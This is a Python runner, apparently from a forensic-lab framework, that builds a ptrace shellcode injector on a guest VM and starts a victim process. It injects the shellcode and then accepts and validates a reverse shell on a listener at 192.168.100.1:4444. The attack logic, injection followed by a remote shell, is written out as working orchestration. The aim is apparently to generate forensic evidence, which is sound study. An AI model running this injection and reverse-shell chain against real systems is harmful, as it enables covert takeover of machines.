"""Explicit runner for the ptrace foreign-allocation shellcode injection scenario."""

from __future__ import annotations

import socket
from collections.abc import Callable
from pathlib import Path

from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import record_operation, run_logged_command
from scenarios.ptrace_fa import shellcode

SCENARIO_ID = "ptrace_fa"
ROOT = Path(__file__).resolve().parent
FILES_DIR = ROOT / "files"

REMOTE_ROOT = "/tmp/forensic-lab/ptrace_fa"

# Where the host listens for the reverse shell; it is the isolated lab
# network's host-side gateway (see infra/provider.py). The shellcode is
# retargeted to this host/port at build time (see shellcode.py).
LISTENER_HOST = "192.168.100.1"
LISTENER_PORT = 4444
SHELL_TIMEOUT = 15

SOURCE_FILES = (
    ("src/shellcode_inject_fa.c", f"{REMOTE_ROOT}/src/shellcode_inject_fa.c"),
    ("src/victim.c", f"{REMOTE_ROOT}/src/victim.c"),
    ("common/ptrace_utils.c", f"{REMOTE_ROOT}/common/ptrace_utils.c"),
    ("common/ptrace_utils.h", f"{REMOTE_ROOT}/common/ptrace_utils.h"),
    ("common/utils.c", f"{REMOTE_ROOT}/common/utils.c"),
    ("common/utils.h", f"{REMOTE_ROOT}/common/utils.h"),
)

BUILD_COMMANDS = (
    "gcc -Wall -Wextra -o shellcode_inject_fa "
    "src/shellcode_inject_fa.c common/ptrace_utils.c common/utils.c",
    "gcc -o victim src/victim.c",
)

# Backgrounded, nohup'd, and disowned so the victim (and the shell it later
# forks) survive the terminal closing while the run continues toward
# acquisition.
START_VICTIM_COMMAND = f"nohup ./victim >{REMOTE_ROOT}/victim.log 2>&1 & disown; echo $!"


def run_ptrace_fa(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
) -> tuple[dict, Callable[[], None]]:
    """Build the PoC, inject shellcode into a live victim, validate the shell."""
    transcript_path.touch()
    listener = _open_listener()
    terminal = ssh.open_terminal()
    reverse_shell = None

    def close_reverse_shell() -> None:
        nonlocal reverse_shell
        if reverse_shell is None:
            return
        reverse_shell.close()
        reverse_shell = None

    try:
        with terminal:
            console.scope("GUEST", "stage and build")
            run_logged_command(
                terminal, command_log_path, f"mkdir -p {REMOTE_ROOT}/src {REMOTE_ROOT}/common"
            )
            _upload_sources(ssh, command_log_path)
            run_logged_command(terminal, command_log_path, f"cd {REMOTE_ROOT}")
            run_logged_command(
                terminal,
                command_log_path,
                shellcode.retarget_command(
                    "src/shellcode_inject_fa.c", LISTENER_HOST, LISTENER_PORT
                ),
            )
            for command in BUILD_COMMANDS:
                run_logged_command(terminal, command_log_path, command, timeout=60)

            console.scope("GUEST", "start victim")
            identity = run_logged_command(
                terminal, command_log_path, "id -un"
            ).combined_output.strip()
            # Interactive job control prints a "[1] <pid>" notice before the
            # echo output, so only the last line is the captured PID.
            victim_output = run_logged_command(
                terminal, command_log_path, START_VICTIM_COMMAND
            ).combined_output.strip()
            victim_pid = victim_output.splitlines()[-1].strip()
            if not victim_pid.isdigit():
                raise RuntimeError(f"Victim PID was not captured: {victim_output!r}")

            console.scope("GUEST", "inject shellcode")
            run_logged_command(
                terminal,
                command_log_path,
                f"./shellcode_inject_fa {victim_pid}",
                timeout=30,
            )

            console.scope("HOST", "validate reverse shell")
            try:
                shell_identity, reverse_shell = _accept_reverse_shell(listener, identity)
            except Exception as exc:
                record_operation(command_log_path, "validate_reverse_shell", error=str(exc))
                raise
            record_operation(command_log_path, "validate_reverse_shell")

            console.scope("GUEST", "validate victim survived")
            survived = run_logged_command(
                terminal, command_log_path, f"kill -0 {victim_pid} && echo alive"
            ).combined_output.strip()
            if survived != "alive":
                raise RuntimeError("Victim process did not survive injection")
    except BaseException:
        close_reverse_shell()
        raise
    finally:
        listener.close()
        try:
            transcript_path.write_text(terminal.transcript, encoding="utf-8")
        except BaseException:
            close_reverse_shell()
            raise

    try:
        facts = {
            "victim_pid": int(victim_pid),
            "victim_process_survived_injection": True,
            "reverse_shell_identity": shell_identity,
            "reverse_shell_connection_open_at_scenario_completion": True,
            "listener_host": LISTENER_HOST,
            "listener_port": LISTENER_PORT,
        }
        assert reverse_shell is not None
        return facts, close_reverse_shell
    except BaseException:
        close_reverse_shell()
        raise


def _upload_sources(ssh: SSHClient, command_log_path: Path) -> None:
    console.step(f"uploading ptrace_fa sources to {REMOTE_ROOT}...")
    try:
        for local_name, remote_path in SOURCE_FILES:
            ssh.put(FILES_DIR / local_name, remote_path)
    except Exception as exc:
        record_operation(command_log_path, "upload_source", error=str(exc))
        raise
    record_operation(command_log_path, "upload_source")


def _open_listener() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((LISTENER_HOST, LISTENER_PORT))
        sock.listen(1)
    except OSError as exc:
        sock.close()
        raise RuntimeError(
            f"Could not listen on {LISTENER_HOST}:{LISTENER_PORT} for the "
            f"shellcode's reverse shell: {exc}"
        ) from exc
    return sock


def _accept_reverse_shell(
    listener: socket.socket,
    expected_identity: str,
) -> tuple[str, socket.socket]:
    console.step(f"waiting for reverse shell on {LISTENER_HOST}:{LISTENER_PORT}...")
    conn = None
    try:
        listener.settimeout(SHELL_TIMEOUT)
        conn, _addr = listener.accept()
        conn.settimeout(SHELL_TIMEOUT)
        conn.sendall(b"id -un\n")
        identity = conn.recv(4096).decode(errors="replace").strip()
        if identity != expected_identity:
            raise RuntimeError(
                f"Reverse shell returned unexpected identity: {identity!r}"
            )
        console.ok(f"Reverse shell connected; identity confirmed: {identity}")
        return identity, conn
    except OSError as exc:
        if conn is not None:
            conn.close()
        raise RuntimeError(f"ptrace_fa reverse shell did not connect: {exc}") from exc
    except BaseException:
        if conn is not None:
            conn.close()
        raise
